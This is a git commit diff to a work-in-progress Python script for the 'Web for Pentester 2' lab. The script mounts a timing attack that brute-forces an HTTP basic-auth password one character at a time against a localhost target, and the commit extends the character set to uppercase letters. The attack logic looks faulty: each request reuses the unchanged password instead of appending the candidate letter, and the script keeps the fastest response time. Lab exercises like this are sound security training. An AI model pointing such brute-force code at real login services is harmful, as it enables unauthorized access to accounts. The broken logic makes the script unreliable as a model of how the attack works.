ac45e4ed7ce663d4d681ff82d044f20c7f5b5c49
Gavin Megson <gmegson@pdx.edu>
2018-07-31 08:14:28 -0700

    update - wip

--- auth2.py
+++ auth2.py
@@ -1,7 +1,4 @@
-"""WIP"""
-
-
-"""Web for Pentester 2: Authorization example2."""
+"""Web for Pentester 2: Authorization example 2."""
 
 """Timing attack."""
 
@@ -14,16 +11,16 @@ password = sys.argv[1]
 r = requests.get("http://localhost:8001/authentication/example2/")
 
 
-"""Example assumes lowercase letters and numbers."""
+"""Example assumes letters and numbers."""
 while r.status_code != 200:
 	nextletter = ''
 	lowestelapsed = 1000.
-	for letter in string.ascii_lowercase + string.digits:
+	for letter in string.ascii_lowercase + string.digits + string.ascii_uppercase:
 		start = time.time()
 		r = requests.get("http://localhost:8001/authentication/example2/",
 			auth=("hacker", password))
 		elapsed = time.time() - start
-		print("Letter " + letter + " in " + str(elapsed))
+		print("Pass " + password + letter + " in " + str(elapsed))
 		if elapsed < lowestelapsed:
 			lowestelapsed = elapsed
 			nextletter = letter
